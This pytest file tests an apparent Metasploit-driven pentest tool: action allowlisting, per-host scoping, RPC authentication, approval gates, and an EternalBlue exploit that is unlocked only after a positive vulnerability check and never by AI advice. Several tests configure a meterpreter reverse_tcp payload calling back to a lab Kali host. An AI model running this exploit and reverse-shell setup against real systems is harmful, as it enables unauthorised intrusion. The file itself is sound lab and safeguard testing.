from exploitation.metasploit_policy import authorize_metasploit_action, build_metasploit_actions
from exploitation.metasploit_client import MetasploitRpcClient, MetasploitRpcError
from exploitation.metasploit_service import MetasploitService, classify_module_result
from config import Config


def _scan():
    return {
        "target_ip": "192.168.56.20",
        "ports": [
            {"port": "445", "state": "open", "service": "microsoft-ds", "product": "Windows SMB"},
            {"port": "80", "state": "open", "service": "http"},
            {"port": "22", "state": "closed", "service": "ssh"},
        ],
    }


def test_policy_builds_actions_from_active_scan_only():
    advice = {
        "attack_paths": [
            {
                "service": "smb",
                "port": 445,
                "recommended_validation": "tcp_reachability_check",
                "technique_ids": ["T1021.002"],
                "reasoning": "SMB is exposed and should be validated.",
            }
        ]
    }

    actions = build_metasploit_actions(_scan(), advice)

    action_ids = {action["action_id"] for action in actions}
    assert "msf_smb_version:192.168.56.20:445" in action_ids
    assert "msf_http_title:192.168.56.20:80" in action_ids
    assert all(action["target"] == "192.168.56.20" for action in actions)
    assert all(action["module_type"] == "auxiliary" for action in actions)

    smb_action = next(
        action
        for action in actions
        if action["action_id"] == "msf_smb_version:192.168.56.20:445"
    )
    assert smb_action["technique_ids"] == ["T1021.002"]
    assert smb_action["source"] == "attack_advice"


def test_metasploit_client_uses_msgrpc_default_api_path_without_trailing_slash():
    client = MetasploitRpcClient(
        "https://127.0.0.1:55552",
        "msf",
        "pass",
        enabled=True,
    )

    assert client.api_url == "https://127.0.0.1:55552/api"


def test_login_accepts_byte_values_from_rpc_response():
    client = MetasploitRpcClient(
        "https://127.0.0.1:55552",
        "msf",
        "pass",
        enabled=True,
    )
    client._call = lambda *args, **kwargs: {b"result": b"success", b"token": b"abc123"}

    assert client.login() == "abc123"
    assert client._token == "abc123"


def test_client_reauthenticates_once_when_cached_token_expires(monkeypatch):
    import exploitation.metasploit_client as client_module

    class FakeMessagePack:
        def packb(self, value, use_bin_type=True):
            return value

        def unpackb(self, value, raw=False):
            return value

    class FakeResponse:
        def __init__(self, content):
            self.content = content

        def raise_for_status(self):
            return None

    responses = iter([
        {"error": True, "error_message": "Invalid Authentication Token"},
        {"result": "success", "token": "fresh-token"},
        {"version": "6.4-test"},
    ])
    posted_payloads = []

    def fake_post(url, **kwargs):
        posted_payloads.append(kwargs["data"])
        return FakeResponse(next(responses))

    client = MetasploitRpcClient(
        "https://127.0.0.1:55552",
        "msf",
        "pass",
        enabled=True,
    )
    client._token = "expired-token"
    monkeypatch.setattr(client, "_msgpack", lambda: FakeMessagePack())
    monkeypatch.setattr(client_module.requests, "post", fake_post)

    result = client.core_version()

    assert result == {"version": "6.4-test"}
    assert client._token == "fresh-token"
    assert posted_payloads == [
        ["core.version", "expired-token"],
        ["auth.login", "msf", "pass"],
        ["core.version", "fresh-token"],
    ]


def test_client_decodes_http_401_login_failure(monkeypatch):
    import exploitation.metasploit_client as client_module

    class FakeMessagePack:
        def packb(self, value, use_bin_type=True):
            return value

        def unpackb(self, value, raw=False):
            return value

    class FakeResponse:
        status_code = 401
        content = {
            "error": True,
            "error_message": b"Login Failed",
            "error_code": 401,
        }

        def raise_for_status(self):
            raise AssertionError("HTTP status should not hide the RPC login error")

    def fake_post(url, **kwargs):
        return FakeResponse()

    client = MetasploitRpcClient(
        "https://127.0.0.1:55552",
        "msf",
        "wrong-pass",
        enabled=True,
    )
    monkeypatch.setattr(client, "_msgpack", lambda: FakeMessagePack())
    monkeypatch.setattr(client_module.requests, "post", fake_post)

    try:
        client.login()
    except MetasploitRpcError as exc:
        message = str(exc)
    else:
        raise AssertionError("Expected MetasploitRpcError")

    assert "Metasploit RPC login failed" in message
    assert "METASPLOIT_RPC_PASS" in message


def test_policy_rejects_arbitrary_or_unscoped_action():
    result = authorize_metasploit_action(
        "exploit/windows/smb/not-in-allowlist:445",
        _scan(),
    )

    assert result["ok"] is False
    assert "not allowed" in result["error"]


def test_policy_scopes_each_action_to_the_host_that_exposed_the_port():
    scan = {
        "hosts": [
            {
                "address": {"primary": "192.168.56.10"},
                "port_findings": [
                    {"port": 80, "state": "open", "service": "http"},
                ],
            },
            {
                "address": {"primary": "192.168.56.20"},
                "port_findings": [
                    {"port": 445, "state": "open", "service": "microsoft-ds"},
                ],
            },
        ],
        # Multi-host normalization also exposes a flattened compatibility list.
        "ports": [
            {"port": 80, "state": "open", "service": "http"},
            {"port": 445, "state": "open", "service": "microsoft-ds"},
        ],
    }

    actions = build_metasploit_actions(scan)
    targets_by_policy = {
        action["policy_key"]: action["target"]
        for action in actions
    }

    assert targets_by_policy["msf_http_title"] == "192.168.56.10"
    assert targets_by_policy["msf_smb_version"] == "192.168.56.20"
    assert {
        action["action_id"] for action in actions
    } >= {
        "msf_http_title:192.168.56.10:80",
        "msf_smb_version:192.168.56.20:445",
    }


def test_known_service_is_not_reinterpreted_only_from_its_port_number():
    scan = {
        "target_ip": "192.168.56.20",
        "ports": [
            {"port": 445, "state": "open", "service": "http"},
        ],
    }

    actions = build_metasploit_actions(scan)

    assert {action["policy_key"] for action in actions} == {"msf_http_title", "msf_http_robots"}


class FakeMetasploitClient:
    def __init__(self):
        self.executed = []
        self.result_requests = []
        self.acknowledged = []

    def status(self):
        return {"ok": True, "enabled": True, "available": True}

    def module_info(self, module_type, module_name):
        return {
            "name": module_name,
            "rank": "normal",
            "description": "scanner module",
        }

    def module_options(self, module_type, module_name):
        return {
            "RHOSTS": {},
            "RPORT": {},
            "THREADS": {},
        }

    def module_execute(self, module_type, module_name, options):
        self.executed.append((module_type, module_name, options))
        return {"job_id": 7, "uuid": "abc"}

    def module_results(self, uuid):
        self.result_requests.append(uuid)
        return {
            "status": "completed",
            "result": {"code": "detected", "message": "SMB service detected"},
        }

    def module_ack(self, uuid):
        self.acknowledged.append(uuid)
        return {"success": True}


def test_service_executes_only_policy_authorized_action():
    client = FakeMetasploitClient()
    service = MetasploitService(client)

    result = service.run_action("msf_smb_version:192.168.56.20:445", _scan())

    assert result["ok"] is True
    assert result["action"]["module_name"] == "scanner/smb/smb_version"
    assert result["rpc_result"]["job_id"] == 7
    assert result["execution_state"] == "completed"
    assert result["module_result"]["result"]["code"] == "detected"
    assert client.result_requests == ["abc"]
    assert client.acknowledged == ["abc"]
    assert client.executed == [
        (
            "auxiliary",
            "scanner/smb/smb_version",
            {"RHOSTS": "192.168.56.20", "RPORT": 445, "THREADS": 1},
        )
    ]


def test_service_reports_unavailable_rpc_without_executing():
    class UnavailableClient(FakeMetasploitClient):
        def status(self):
            return {"ok": False, "enabled": True, "available": False, "error": "connection refused"}

    client = UnavailableClient()
    service = MetasploitService(client)

    result = service.run_action("msf_smb_version:192.168.56.20:445", _scan())

    assert result["ok"] is False
    assert result["error"] == "connection refused"
    assert client.executed == []


def test_service_keeps_accepted_submission_when_result_tracking_is_unavailable():
    class TrackingUnavailableClient(FakeMetasploitClient):
        def module_results(self, uuid):
            raise RuntimeError("module.results unavailable")

    client = TrackingUnavailableClient()
    service = MetasploitService(client)

    result = service.run_action(
        "msf_smb_version:192.168.56.20:445",
        _scan(),
    )

    assert result["ok"] is True
    assert result["execution_state"] == "submitted"
    assert result["completed"] is False
    assert "module.results unavailable" in result["module_result"]["tracking_error"]


def test_shared_service_registry_constructs_metasploit_service():
    from core import services

    assert isinstance(services.metasploit_client, MetasploitRpcClient)
    assert isinstance(services.metasploit_service, MetasploitService)
    assert services.metasploit_client.base_url == Config.METASPLOIT_RPC_URL
    assert services.metasploit_client.enabled is Config.ENABLE_METASPLOIT


def test_authenticated_metasploit_routes_use_shared_service(monkeypatch):
    import app as app_module
    import routes.pentest_routes as pentest_routes

    class FakeService:
        def status(self):
            return {
                "ok": True,
                "enabled": True,
                "available": True,
                "version": {"version": "test"},
            }

        def propose_actions(self, parsed_results, attack_advice, previous_results=None):
            assert parsed_results["target_ip"] == "192.168.56.20"
            assert previous_results == {}
            return {"ok": True, "count": 1, "actions": [{"action_id": "safe:445"}]}

        def run_action(
            self,
            action_id,
            parsed_results,
            attack_advice,
            approved=False,
            previous_results=None,
        ):
            assert action_id == "safe:445"
            assert previous_results == {}
            return {
                "ok": True,
                "timestamp": "2026-07-11T00:00:00Z",
                "action": {
                    "module_type": "auxiliary",
                    "module_name": "scanner/smb/smb_version",
                    "target": parsed_results["target_ip"],
                    "port": 445,
                },
                "summary": "Safe scanner completed.",
            }

    old_token = app_module.Config.OPERATOR_TOKEN
    app_module.Config.OPERATOR_TOKEN = "test-operator-token"
    app_module.app.config["TESTING"] = True
    monkeypatch.setattr(pentest_routes, "metasploit_service", FakeService())
    monkeypatch.setattr(pentest_routes, "_load_current_scan_results", _scan)
    monkeypatch.setattr(pentest_routes, "_active_attack_advice", lambda: {})
    monkeypatch.setattr(pentest_routes, "_active_metasploit_results", lambda: {})
    monkeypatch.setattr(pentest_routes, "_save_active_scan_fields", lambda **fields: None)

    try:
        client = app_module.app.test_client()
        unlock = client.post(
            "/operator/unlock",
            json={"operator_token": "test-operator-token"},
        )
        csrf_token = unlock.get_json()["csrf_token"]
        headers = {"X-CSRF-Token": csrf_token}

        status = client.get("/pentest/metasploit/status")
        assert status.status_code == 200
        assert status.get_json()["available"] is True

        proposed = client.post("/pentest/metasploit/propose", json={}, headers=headers)
        assert proposed.status_code == 200
        assert proposed.get_json()["actions"][0]["action_id"] == "safe:445"

        executed = client.post(
            "/pentest/metasploit/run",
            json={"action_id": "safe:445", "approved": True},
            headers=headers,
        )
        assert executed.status_code == 200
        assert executed.get_json()["summary"] == "Safe scanner completed."
    finally:
        app_module.Config.OPERATOR_TOKEN = old_token


def test_ms17_010_exploit_proposed_only_after_positive_safe_check():
    scan = {
        "target_ip": "10.10.20.50",
        "ports": [
            {"port": 445, "state": "open", "service": "microsoft-ds", "product": "Windows 10"},
        ],
    }

    actions = build_metasploit_actions(scan)
    assert all(action["module_type"] == "auxiliary" for action in actions)
    assert "msf_smb_ms17_010_exploit:10.10.20.50:445" not in {
        action["action_id"] for action in actions
    }

    previous_results = {
        "runs": [{
            "action": {
                "policy_key": "msf_smb_ms17_010_check",
                "target": "10.10.20.50",
                "port": 445,
            },
            "validation_outcome": "vulnerable",
        }]
    }
    actions = build_metasploit_actions(scan, previous_results=previous_results)
    exploit_action = next(
        (a for a in actions if a["policy_key"] == "msf_smb_ms17_010_exploit"),
        None,
    )
    assert exploit_action is not None
    assert exploit_action["module_name"] == "windows/smb/ms17_010_eternalblue"
    assert exploit_action["module_type"] == "exploit"
    assert exploit_action["requires_approval"] is True
    assert exploit_action["allow_session"] is True
    assert exploit_action["payload"]["name"] == "windows/x64/meterpreter/reverse_tcp"
    assert exploit_action["source"] == "metasploit_validation"


def test_ai_exploit_advice_cannot_unlock_ms17_010_exploit():
    scan = {
        "target_ip": "10.10.20.50",
        "ports": [
            {"port": 445, "state": "open", "service": "microsoft-ds"},
        ],
    }
    advice = {
        "attack_paths": [
            {
                "service": "smb",
                "port": 445,
                "recommended_validation": "smb_ms17_010",
                "recommended_module_type": "exploit",
                "propose_exploit": True,
                "technique_ids": ["T1203"],
                "reasoning": "Operator-approved EternalBlue path.",
            }
        ]
    }

    actions = build_metasploit_actions(scan, advice)
    assert not any(a["policy_key"] == "msf_smb_ms17_010_exploit" for a in actions)


def test_positive_check_must_match_exact_target_and_port():
    previous_results = {
        "runs": [{
            "action": {
                "policy_key": "msf_smb_ms17_010_check",
                "target": "10.10.20.51",
                "port": 445,
            },
            "validation_outcome": "vulnerable",
        }]
    }
    actions = build_metasploit_actions(_scan(), previous_results=previous_results)
    assert not any(a["policy_key"] == "msf_smb_ms17_010_exploit" for a in actions)


def _positive_check_results():
    return {
        "runs": [{
            "action": {
                "policy_key": "msf_smb_ms17_010_check",
                "target": "192.168.56.20",
                "port": 445,
            },
            "validation_outcome": "vulnerable",
        }]
    }


def _exploit_action():
    return next(
        action
        for action in build_metasploit_actions(
            _scan(),
            previous_results=_positive_check_results(),
        )
        if action["policy_key"] == "msf_smb_ms17_010_exploit"
    )


def test_exploit_options_include_payload_callback_when_module_options_omit_them(monkeypatch):
    client = FakeMetasploitClient()
    service = MetasploitService(client, exploit_execution_enabled=True)
    action = _exploit_action()
    policy = service.policies_by_key[action["policy_key"]]
    monkeypatch.setattr(Config, "KALI_IP", "192.168.56.10")
    monkeypatch.setattr(Config, "METASPLOIT_LPORT", 4445)

    options = service._build_options(action, {"RHOSTS": {}, "RPORT": {}}, policy)

    assert options == {
        "RHOSTS": "192.168.56.20",
        "RPORT": 445,
        "PAYLOAD": "windows/x64/meterpreter/reverse_tcp",
        "LHOST": "192.168.56.10",
        "LPORT": 4445,
    }


class FakeExploitClient(FakeMetasploitClient):
    def __init__(self, sessions):
        super().__init__()
        self.sessions = iter(sessions)
        self.stopped_sessions = []
        self.stopped_jobs = []

    def module_options(self, module_type, module_name):
        return {"RHOSTS": {}, "RPORT": {}}

    def session_list(self):
        return next(self.sessions)

    def session_stop(self, session_id):
        self.stopped_sessions.append(str(session_id))
        return {"result": "success"}

    def job_stop(self, job_id):
        self.stopped_jobs.append(str(job_id))
        return {"result": "success"}


def test_completed_exploit_requires_target_verified_new_session(monkeypatch):
    import exploitation.metasploit_service as service_module

    client = FakeExploitClient([
        {"7": {"session_host": "192.168.56.99"}},
        {
            "7": {"session_host": "192.168.56.99"},
            "8": {"tunnel_peer": "192.168.56.20:49152"},
        },
    ])
    service = MetasploitService(
        client,
        exploit_execution_enabled=True,
        session_timeout=0,
    )
    monkeypatch.setattr(Config, "KALI_IP", "192.168.56.10")
    monkeypatch.setattr(service_module, "_local_ipv4_addresses", lambda: {"192.168.56.10"})

    result = service.run_action(
        _exploit_action()["action_id"],
        _scan(),
        approved=True,
        previous_results=_positive_check_results(),
    )

    assert result["module_completed"] is True
    assert result["session_created"] is True
    assert result["new_session_ids"] == ["8"]
    assert result["target_session_ids"] == ["8"]
    assert result["execution_succeeded"] is True


def test_completed_exploit_without_session_is_not_success(monkeypatch):
    import exploitation.metasploit_service as service_module

    client = FakeExploitClient([{}, {}])
    service = MetasploitService(
        client,
        exploit_execution_enabled=True,
        session_timeout=0,
    )
    monkeypatch.setattr(Config, "KALI_IP", "192.168.56.10")
    monkeypatch.setattr(service_module, "_local_ipv4_addresses", lambda: {"192.168.56.10"})

    result = service.run_action(
        _exploit_action()["action_id"],
        _scan(),
        approved=True,
        previous_results=_positive_check_results(),
    )

    assert result["module_completed"] is True
    assert result["session_created"] is False
    assert result["new_session_ids"] == []
    assert result["execution_succeeded"] is False


def test_remote_exploit_rejects_loopback_kali_ip(monkeypatch):
    client = FakeExploitClient([])
    service = MetasploitService(client, exploit_execution_enabled=True)
    monkeypatch.setattr(Config, "KALI_IP", "127.0.0.1")

    result = service.run_action(
        _exploit_action()["action_id"],
        _scan(),
        approved=True,
        previous_results=_positive_check_results(),
    )

    assert result["ok"] is False
    assert "remote target cannot return" in result["error"]
    assert client.executed == []


def test_module_result_classification_distinguishes_check_outcomes():
    assert classify_module_result("check", {"result": {"code": "appears"}}) == "vulnerable"
    assert classify_module_result("check", {"result": {"message": "Host is not vulnerable"}}) == "not_vulnerable"
    assert classify_module_result("check", {"result": "connection refused"}) == "inconclusive"
    assert classify_module_result("check", {"result": {"code": "detected"}}) == "observed"


def test_cleanup_closes_only_target_verified_sessions_and_stops_job():
    client = FakeExploitClient([])
    service = MetasploitService(client, exploit_execution_enabled=True)
    record = {
        "run_id": "msf_test",
        "target_session_ids": ["8"],
        "new_session_ids": ["8", "9"],
        "rpc_result": {"job_id": 7},
        "summary": "Session opened.",
    }

    result = service.cleanup_run(record, approved=True)

    assert result["ok"] is True
    assert client.stopped_sessions == ["8"]
    assert client.stopped_jobs == ["7"]
    assert result["record"]["execution_state"] == "session_closed"
    assert result["record"]["session_closed"] is True
    assert result["record"]["snapshot_revert_required"] is True
